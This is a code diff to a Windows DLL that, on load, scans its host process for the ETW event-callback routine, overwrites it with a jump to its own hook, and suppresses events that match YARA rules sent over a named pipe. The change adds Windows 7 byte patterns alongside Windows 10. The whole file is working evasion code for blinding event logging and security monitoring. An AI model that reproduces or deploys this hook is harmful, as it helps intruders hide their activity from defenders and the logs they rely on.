@@ -17,12 +17,34 @@
 #pragma comment (lib, "libyara64.lib")
 
 // pattern for the start of the ETW callback.
-#define PATTERN "\x48\x83\xec\x38\x4c\x8b\x0d"
+#define PATTERN_WIN10 "\x48\x83\xec\x38\x4c\x8b\x0d"
+#define PATTERN_WIN7  "\xff\xf3\x48\x81\xec\x20\x06\x00\x00\x48\xc7\x44\x24\x20\xfe\xff\xff\xff"
 
-CHAR*  cRule;
+#define NUMBACKBYTES_WIN10 50
+#define NUMBACKBYTES_WIN7 140
+
+CHAR* cRule;
 LPVOID lpCallbackOffset;
-CHAR   OriginalBytes[50] = {};
+CHAR   OriginalBytes[NUMBACKBYTES_WIN7] = {};
+DWORD numBackupBytes = NUMBACKBYTES_WIN10;
 BOOL   bActiveRuleChange = FALSE;
+
+
+
+BOOL isWin10()
+{
+
+	/*
+	Function is used to differentiate between Windows 10 and Windows 7
+	*/
+
+	OSVERSIONINFOEXA info;
+	DWORDLONG cond = 0;
+	info.dwMajorVersion = 10;
+	VER_SET_CONDITION(cond, VER_MAJORVERSION, VER_GREATER_EQUAL);
+
+	return VerifyVersionInfoA(&info, VER_MAJORVERSION, cond);
+}
 
 VOID HookEtwCallback()
 {
@@ -34,7 +56,7 @@ VOID HookEtwCallback()
 
 	unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };
 
-	*(void **)(boing + 2) = &EtwCallbackHook;
+	*(void**)(boing + 2) = &EtwCallbackHook;
 
 	VirtualProtect(lpCallbackOffset, 13, PAGE_EXECUTE_READWRITE, &oldProtect);
 	memcpy(lpCallbackOffset, boing, sizeof(boing));
@@ -43,7 +65,7 @@ VOID HookEtwCallback()
 	return;
 }
 
-VOID DoOriginalEtwCallback( EVENT_RECORD *EventRecord )
+VOID DoOriginalEtwCallback(EVENT_RECORD* EventRecord)
 {
 	/*
 	Restore the original ETW callback and then call it.
@@ -52,9 +74,9 @@ VOID DoOriginalEtwCallback( EVENT_RECORD *EventRecord )
 
 	DWORD dwOldProtect;
 
-	VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &dwOldProtect);
-	memcpy(lpCallbackOffset, OriginalBytes, sizeof(OriginalBytes));
-	VirtualProtect(lpCallbackOffset, sizeof(OriginalBytes), dwOldProtect, &dwOldProtect);
+	VirtualProtect(lpCallbackOffset, numBackupBytes, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+	memcpy(lpCallbackOffset, OriginalBytes, numBackupBytes);
+	VirtualProtect(lpCallbackOffset, numBackupBytes, dwOldProtect, &dwOldProtect);
 
 	EtwEventCallback_ EtwEventCallback = (EtwEventCallback_)lpCallbackOffset;
 
@@ -63,7 +85,7 @@ VOID DoOriginalEtwCallback( EVENT_RECORD *EventRecord )
 	HookEtwCallback();
 }
 
-VOID RemoveTrailingSpace( PEVENT_MAP_INFO EventMapInfo )
+VOID RemoveTrailingSpace(PEVENT_MAP_INFO EventMapInfo)
 {
 	/*
 	Remove the extra space at the end.
@@ -79,9 +101,9 @@ VOID RemoveTrailingSpace( PEVENT_MAP_INFO EventMapInfo )
 	}
 }
 
-VOID GetMapInfo( PEVENT_RECORD EventRecord, 
-	PWCHAR MapName, 
-	ULONG DecodingSource, 
+VOID GetMapInfo(PEVENT_RECORD EventRecord,
+	PWCHAR MapName,
+	ULONG DecodingSource,
 	PEVENT_MAP_INFO EventMapInfo
 )
 {
@@ -105,7 +127,7 @@ VOID GetMapInfo( PEVENT_RECORD EventRecord,
 	}
 }
 
-INT ToReportOrNotToReportThatIsTheQuestion( YR_SCAN_CONTEXT* Context,
+INT ToReportOrNotToReportThatIsTheQuestion(YR_SCAN_CONTEXT* Context,
 	INT Message,
 	PVOID pMessageData,
 	PVOID pUserData
@@ -129,7 +151,7 @@ INT ToReportOrNotToReportThatIsTheQuestion( YR_SCAN_CONTEXT* Context,
 	return CALLBACK_CONTINUE;
 }
 
-VOID WINAPI EtwCallbackHook( PEVENT_RECORD EventRecord )
+VOID WINAPI EtwCallbackHook(PEVENT_RECORD EventRecord)
 {
 	/*
 	Parse the event into a format that can be scanned with a yara rule.
@@ -137,7 +159,7 @@ VOID WINAPI EtwCallbackHook( PEVENT_RECORD EventRecord )
 	If it does not match and the name of the pipe is not in the event then report the event.
 	If it does match then return and ignore the event.
 	*/
-
+	
 	ULONG size = 0;
 	DWORD dwReport = 0;
 	DWORD dwCurrentHeapSize = 0;
@@ -233,7 +255,7 @@ VOID WINAPI EtwCallbackHook( PEVENT_RECORD EventRecord )
 	{
 		dwReport = 1;
 	}
-	
+
 	if (dwReport == 0)
 	{
 		if (strstr(StringBuffer, PIPE_NAME) == NULL)
@@ -258,9 +280,12 @@ BOOL PlaceHook()
 	DWORD_PTR dwBase;
 	DWORD i, dwSizeNeeded;
 	CHAR cStringBuffer[200];
-	HMODULE hModules[102400];
+	HMODULE hModules[500];
 	TCHAR   szModule[MAX_PATH];
 	DWORD oldProtect, oldOldProtect;
+	const char* pattern = PATTERN_WIN7;
+	DWORD patternLen = strlen(PATTERN_WIN7);
+
 
 	if (EnumProcessModules(GetCurrentProcess(), hModules, sizeof(hModules), &dwSizeNeeded))
 	{
@@ -282,18 +307,23 @@ BOOL PlaceHook()
 	//OutputDebugStringA(cStringBuffer);
 	//memset(cStringBuffer, '\0', strlen(cStringBuffer));
 
+	if (isWin10())
+	{
+		pattern = PATTERN_WIN10;
+		patternLen = strlen(PATTERN_WIN10);
+	}
+
 	for (i = 0; i < 0xfffff; i++)
 	{
 
-		if (!memcmp((PVOID)(dwBase + i), (unsigned char*)PATTERN, strlen(PATTERN)))
+		if (!memcmp((PVOID)(dwBase + i), (unsigned char*)pattern, patternLen))
 		{
 			lpCallbackOffset = (LPVOID)(dwBase + i);
-
 			//sprintf(cStringBuffer, "[i] Offset: 0x%llx\n", lpCallbackOffset);
 			//OutputDebugStringA(cStringBuffer);
 			//memset(cStringBuffer, '\0', strlen(cStringBuffer));
 
-			memcpy(OriginalBytes, lpCallbackOffset, 50);
+			memcpy(OriginalBytes, lpCallbackOffset, numBackupBytes);
 
 			HookEtwCallback();
 
@@ -314,7 +344,7 @@ DWORD WINAPI RuleController(LPVOID lpParam)
 	While a rule is being changed all events will be dropped.
 	*/
 
-	CHAR*  cBuffer;
+	CHAR* cBuffer;
 	DWORD  dwPipeRead;
 	DWORD  dwHeapSize = 31337;
 	HANDLE HeapHandle, hPipe;
@@ -341,13 +371,13 @@ DWORD WINAPI RuleController(LPVOID lpParam)
 	YRCompilerGetRules(yrCompiler, &yrRules);
 
 	hPipe = CreateNamedPipeA(RULE_PIPE_NAME,
-							 PIPE_ACCESS_DUPLEX,
-							 PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
-							 1,
-							 31337,
-							 31337,
-							 NMPWAIT_USE_DEFAULT_WAIT,
-							 NULL);
+		PIPE_ACCESS_DUPLEX,
+		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+		1,
+		31337,
+		31337,
+		NMPWAIT_USE_DEFAULT_WAIT,
+		NULL);
 
 	while (hPipe != INVALID_HANDLE_VALUE)
 	{
@@ -363,7 +393,6 @@ DWORD WINAPI RuleController(LPVOID lpParam)
 			}
 
 			bActiveRuleChange = TRUE;
-
 			YRRulesDestroy(yrRules);
 			YRCompilerDestroy(yrCompiler);
 			YRFinalize();
@@ -430,20 +459,20 @@ CLEANUP:
 	return;
 }
 
-BOOL APIENTRY DllMain( HMODULE hModule,
+BOOL APIENTRY DllMain(HMODULE hModule,
 	DWORD  ul_reason_for_call,
-    LPVOID lpReserved
+	LPVOID lpReserved
 )
 {
-    switch (ul_reason_for_call)
-    {
-    case DLL_PROCESS_ATTACH:
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
 		EvtMuteMain();
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-    case DLL_PROCESS_DETACH:
-        break;
-    }
-    return TRUE;
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
 }
 
